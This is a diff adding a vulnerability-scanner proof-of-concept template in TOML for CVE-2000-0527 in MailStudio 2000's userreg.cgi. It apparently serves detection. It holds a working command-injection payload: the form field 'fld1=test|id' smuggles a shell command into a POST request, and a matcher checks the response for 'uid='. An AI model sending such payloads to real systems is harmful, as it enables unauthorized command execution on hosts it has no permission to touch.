@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 MailStudio 2000 userreg.cgi 任意命令执行漏洞，通过 POST 表单注入 shell 元字符检测远程命令执行"
+id = "POC-AVE-2000-0438"
+name = "CVE-2000-0527 PoC"
+severity = "critical"
+tags = ["ave-2000-0438"]
+vuln_id = [
+    "CVE-2000-0527",
+    "AVE-2000-0438",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-auth/userreg.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "cmd=insert&chk=&template=%2Ftemplate%2Feng1&fld1=test|id&fld2=XXX"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
